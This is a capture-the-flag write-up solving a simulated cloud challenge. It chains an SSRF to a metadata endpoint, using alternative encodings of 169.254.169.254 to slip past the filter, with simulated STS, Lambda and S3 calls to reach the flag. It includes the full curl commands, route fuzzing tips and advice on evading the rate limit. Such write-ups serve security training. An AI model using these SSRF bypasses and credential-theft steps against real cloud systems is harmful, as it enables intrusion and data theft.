# Confused Deputy — CTF Writeup

**Category:** IAM / Cloud
**Points:** 300
**Target:** `https://imbank-satoshi-startup-portal.chals.io/cloud/deputy/`

**Flag:** `flag{inm_c0nfus3d_d3puty_1md5_byp4ss}`

---

## TL;DR

The "status dashboard" does not perform real HTTP requests. It behaves as a stateful
simulator of IMDS, STS, Lambda and S3, exposed through JSON endpoints, with the state held
in the Flask session cookie. The intended chain is:

```
/check (SSRF -> IMDS)  ->  /sts/assume-role  ->  /lambda/invoke  ->  /s3/get
```

Getting there required one bypass (an alternative IP encoding of `169.254.169.254`) and one
discovery step (three of the four routes are not referenced anywhere in the UI).

```bash
B=https://imbank-satoshi-startup-portal.chals.io/cloud/deputy; J=/tmp/cj

curl -sS -c $J -b $J -X POST $B/check -H 'Content-Type: application/json' \
  -d '{"url":"http://2852039166/latest/api/token"}'

curl -sS -c $J -b $J -X POST $B/check -H 'Content-Type: application/json' \
  -d '{"url":"http://2852039166/latest/meta-data/iam/security-credentials/frontend"}'

curl -sS -c $J -b $J -X POST $B/sts/assume-role -H 'Content-Type: application/json' \
  -d '{"role_arn":"arn:aws:iam::123456789012:role/role-a"}'

curl -sS -c $J -b $J -X POST $B/lambda/invoke -H 'Content-Type: application/json' \
  -d '{"function":"backend"}'

curl -sS -c $J -b $J -X POST $B/s3/get -H 'Content-Type: application/json' \
  -d '{"bucket":"flag-bucket","key":"flag.txt"}'
```

---

## 1. Recon: what the dashboard actually does

The page posts a URL to `/cloud/deputy/check` and echoes the JSON back:

```js
fetch('/cloud/deputy/check', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({url})})
```

The obvious read is "SSRF proxy". The first thing to establish is whether it really fetches.

```bash
curl -sS -X POST https://.../cloud/deputy/check -H 'Content-Type: application/json' \
  -d '{"url":"http://example.com/"}'
# {"body":"<html>example.com</html>"}
```

That looks like a real fetch until you try things that cannot be reached:

| Input | Observed response |
|---|---|
| `http://nonexistent-zzz/` | `{"body":"<html>nonexistent-zzz</html>"}` |
| `http://2852039166:1/latest/api/token` | `{"body":"imds_token_abc123"}` (port ignored) |
| `http://example.com/latest/api/token` | `{"body":"<html>example.com</html>"}` |

**Observations** (directly from responses):

- `<html>HOST</html>` is the default response for anything the simulator does not special-case.
  Echoing the hostname is *not* evidence of a successful fetch.
- Metadata behaviour depends on the **host as well as the path**: a metadata path sent to an
  ordinary hostname returns the stub.
- Ports in the URL have no effect on the response.

**Inference** (not proven from source):

- The dispatcher keys on parsed host + path, where only hosts that parse to `169.254.169.254`
  reach the IMDS handler.

### The mistake to avoid

Because of the stub, an early theory was "it dispatches on path only". That is wrong — I
verified it by sending a metadata path to a normal host and getting the stub back. The
original handoff note that `http://169.254.169.254/latest/api/token` and the decimal form
both work is also misleading in one detail: the literal IP is only blocked on *some* paths
(see §2).

## 2. SSRF filter and the IMDSv2 bypass

Literal metadata host on the credential path:

```bash
-d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/frontend"}'
# {"error":"blocked by SSRF filter"}
```

Same literal host on the token path:

```bash
-d '{"url":"http://169.254.169.254/latest/api/token"}'
# {"body":"imds_token_abc123"}
```

**Observed:** the filter does not blanket-block the IP. It rejects the literal address on the
metadata read paths while the token endpoint stays reachable literally.

**Observed:** these encodings all reach the metadata endpoints:

- decimal — `http://2852039166/...`
- hex — `http://0xA9FEA9FE/...`
- octal — `http://0251.0376.0251.0376/...`

**Hypothesis:** the check dereferences or normalises the hostname and compares it against the
literal string `169.254.169.254`, so any encoding that the URL parser resolves back to the
same address slips past it.

**Unresolved:** the exact implementation. I never saw the server source. Whether the filter
resolves DNS, normalises integer/hex/octal forms, or compares the raw hostname string is not
established — only that these encodings bypass it and the plain form does not. The asymmetry
between the token path and the metadata paths is likewise unexplained at the code level.

### IMDSv2 state

IMDSv2 is enforced, but the token is **not** sent back as a header by us — it is stored in the
server-side session. Ordering matters within one session:

```bash
# fresh session, read creds directly
-d '{"url":"http://2852039166/latest/meta-data/iam/security-credentials/frontend"}'
# HTTP 401 {"error":"IMDSv2 token required"}

# then request the token, then read again
-d '{"url":"http://2852039166/latest/api/token"}'   # {"body":"imds_token_abc123"}
-d '{"url":"http://2852039166/latest/meta-data/iam/security-credentials/frontend"}'
# {"body":{"AccessKeyId":"ASIA_FRONTEND","SecretAccessKey":"sf_frontend","Token":"sess_frontend"}}
```

Role names are **prefix-matched**: querying `.../security-credentials/frontend-role` also
returns the `frontend` credentials. Only `frontend` exists in the list — `role-a` is *not*
reachable through IMDS.

## 3. The synthetic credentials are the point

The credentials look fake (`ASIA_FRONTEND` is not a 20-character key id), and treating them
as real wastes time:

```bash
aws sts get-caller-identity --profile deputy
# An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation:
# The security token included in the request is invalid.
```

Region changes make no difference. **There is no real AWS account behind this challenge** —
it ships its own STS. The failure is the useful signal: the credentials are challenge-local
material for the simulated STS route, not something the public AWS API will authenticate.

## 4. Finding the rest of the API

### Step 1 — decode the session cookie

`/check` only implements IMDS. The assumption "assume-role must be another URL inside
`/check`" cost significant time: STS/Lambda/S3-shaped URLs sent to `/check` all returned the
stub and changed no state.

The cookie is the map. Flask session cookies are **signed, not encrypted**: the payload is
base64+zlib, and the signature only lets the server detect tampering. Anyone holding the
cookie can read it:

```python
import base64, json, zlib
p = cookie.split('.')[1]; p += '=' * (-len(p) % 4)
print(json.loads(zlib.decompress(base64.urlsafe_b64decode(p))))
```

```python
{'deputy': {'creds_frontend': None, 'creds_role_a': None,
            'flag_read': False, 'imds_token': None},
 'tokens_used::cloud_deputy': 20}
```

**What this does and does not give you.** Reading is free; writing is not. Changing
`creds_role_a` to a fabricated value and re-sending it would require the app's `SECRET_KEY`,
which I did not recover. So the cookie was useful purely as reconnaissance: it named the
remaining stages (`creds_role_a`, `flag_read`) and told me the chain had three more steps,
all keyed to one session, instead of being an open-ended set of SSRF payloads.

### Step 2 — enumerate routes using 404 vs 405

With the state keys as vocabulary, I fuzzed paths under `/cloud/deputy/`. Two signals made
this cheap and unambiguous:

- Unknown paths return the normal **404** page. `/cloud/deputy/docs` is one of them, so the
  commented-out documentation link in the page source is a decoy.
- An existing path addressed with the wrong verb returns **405 Method Not Allowed**. That
  distinction is what turns "path exists" into a fact rather than a guess.

Reconnaissance and throttling notes: sequential requests at ~1–2/s were fine, but ~8
concurrent requests returned `429 TOO MANY REQUESTS` (see §6), so the fuzz needed retry and
backoff.

What the enumeration produced, in order:

| Step | Probe | Result | What it told me |
|---|---|---|---|
| 1 | `GET /cloud/deputy/health` | `200 {"ok":true}` | Hidden ops routes exist beyond the UI |
| 2 | `GET /cloud/deputy/lambda/invoke` | `405` | A real route; needs POST |
| 3 | `POST /cloud/deputy/lambda/invoke` (no state) | `401 {"error":"no role-a credentials"}` | Confirms the next prerequisite by name |
| 4 | fuzz `sts/*`, `s3/*`, `role*`, `assume*` | `POST /sts/assume-role`, `POST /s3/get` | The two missing stages |

The 401 body was the key hint: it names `role-a`, which is exactly the state key
(`creds_role_a`) exposed by the cookie. The decoded state told me *what* was missing; the
401 told me *how the server referred to it*.

Final route table:

| Route | Method | Behaviour |
|---|---|---|
| `/cloud/deputy/health` | GET | `{"ok":true}` |
| `/cloud/deputy/sts/assume-role` | POST | 401 until `creds_frontend` is in session |
| `/cloud/deputy/lambda/invoke` | POST | 401 `{"error":"no role-a credentials"}` |
| `/cloud/deputy/s3/get` | POST | flag read |

`/check` ignores extra JSON fields (`headers`, `method`); only `url` matters.

## 5. Walking the chain

All five calls must share one cookie jar, in order. Full request and response for each stage,
captured from a fresh session:

**1 — IMDSv2 token**

```http
POST /cloud/deputy/check
{"url":"http://2852039166/latest/api/token"}

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=...; HttpOnly; Path=/

{"body":"imds_token_abc123"}
```

**2 — Frontend credentials**

```http
POST /cloud/deputy/check
{"url":"http://2852039166/latest/meta-data/iam/security-credentials/frontend"}

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=...; HttpOnly; Path=/

{"body":{"AccessKeyId":"ASIA_FRONTEND","SecretAccessKey":"sf_frontend","Token":"sess_frontend"}}
```

**3 — Assume role-a** (`role_arn` is the accepted field; the account id is arbitrary to the simulator)

```http
POST /cloud/deputy/sts/assume-role
{"role_arn":"arn:aws:iam::123456789012:role/role-a"}

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=...; HttpOnly; Path=/

{"Credentials":{"AccessKeyId":"ASIA_ROLEA","SecretAccessKey":"sf_rolea"}}
```

**4 — Invoke the backend Lambda**

```http
POST /cloud/deputy/lambda/invoke
{"function":"backend"}

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=...; HttpOnly; Path=/

{"response":"invoked backend; use /s3/get with backend_creds"}
```

**5 — Read S3**

```http
POST /cloud/deputy/s3/get
{"bucket":"flag-bucket","key":"flag.txt"}

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=...; HttpOnly; Path=/

{"body":"flag{inm_c0nfus3d_d3puty_1md5_byp4ss}","bucket":"inm-flag-bucket"}
```

Note the last response: I asked for `flag-bucket`, and the simulator answered with
`inm-flag-bucket`. The bucket/key arguments are accepted but not validated against anything —
another sign this is a scripted simulation rather than S3.

Final session state confirms every stage was recorded server-side:

```python
{'deputy': {'creds_frontend': {'AccessKeyId': 'ASIA_FRONTEND', 'SecretAccessKey': 'sf_frontend', 'Token': 'sess_frontend'},
            'creds_role_a': {'AccessKeyId': 'ASIA_ROLEA', 'SecretAccessKey': 'sf_rolea'},
            'flag_read': True,
            'imds_token': 'imds_token_abc123'},
 'tokens_used::cloud_deputy': 63}
```

## 6. Practical notes

- **Cookie jar is mandatory.** Every stage reads and writes server-side session state;
  separate `curl` invocations without `-c/-b` restart at step 1. The `Set-Cookie` header is
  re-issued on every request as the state advances.
- **Rate limiting**: bursts of ~8 concurrent requests return `429 TOO MANY REQUESTS`.
  Sequential requests at ~1–2/s are fine. The `tokens_used::cloud_deputy` counter rises per
  request but is not a cross-session cap (I passed 1200 with no lockout), so fuzzing works if
  you throttle and retry on 429.
- **`aws` CLI is a dead end** for this challenge by design.

## 7. What was confirmed vs. hypothesised

| Claim | Status |
|---|---|
| Responses are simulated, not fetched | Confirmed (nonexistent host yields the same stub) |
| Dispatch considers host, not only path | Confirmed (metadata path on a normal host returns the stub) |
| Ports in the URL are ignored | Confirmed |
| Filter blocks the literal IP on metadata paths only | Confirmed (token path allowed literally) |
| Decimal/hex/octal encodings bypass the filter | Confirmed |
| IMDSv2 token lives in the session, not a header | Confirmed (401 before token, 200 after, no header sent) |
| Role lookup is prefix-matched; only `frontend` exists | Confirmed |
| Session cookie is readable but not forgeable without the key | Confirmed for reading; forging not attempted successfully |
| Three more routes exist beyond `/check` | Confirmed (404 vs 405 plus direct responses) |
| `/s3/get` does not validate bucket/key | Confirmed (`flag-bucket` → `inm-flag-bucket`) |
| Full chain and flag | Confirmed twice end-to-end |
| Exact filter implementation / why token path differs | **Not resolved** — no source or route discloses it |
| Framework is Flask | Inferred from session-cookie format and 405/404 behaviour, not from source |
